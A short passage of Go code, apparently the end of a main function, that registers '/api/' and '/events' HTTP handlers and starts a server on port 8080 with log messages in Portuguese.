	http.HandleFunc("/api/", apiHandler)
	http.HandleFunc("/events", eventsHandler)

	addr := ":8080"
	logger.Printf("Servidor ouvindo em %s", addr)
	if err := http.ListenAndServe(addr, nil); err != nil {
		logger.Fatalf("Erro ao iniciar servidor: %v", err)
	}
}
